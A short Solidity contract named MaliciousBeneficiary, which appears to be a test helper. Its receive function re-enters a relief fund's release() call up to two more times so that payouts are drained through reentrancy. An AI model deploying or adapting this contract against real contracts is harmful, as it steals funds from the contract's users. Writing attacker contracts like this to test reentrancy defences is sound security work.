// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IReliefFund {
    function release(uint256 claimId, uint256 reliefId) external;
}

contract MaliciousBeneficiary {
    IReliefFund public reliefFund;
    uint256 public claimId;
    uint256 public reliefId;
    uint256 public attackCount;

    constructor(address _reliefFund) {
        reliefFund = IReliefFund(_reliefFund);
    }

    function setTarget(uint256 _claimId, uint256 _reliefId) external {
        claimId = _claimId;
        reliefId = _reliefId;
    }

    receive() external payable {
        if (attackCount < 2) {
            attackCount++;
            reliefFund.release(claimId, reliefId); // Attempts reentrancy
        }
    }
}
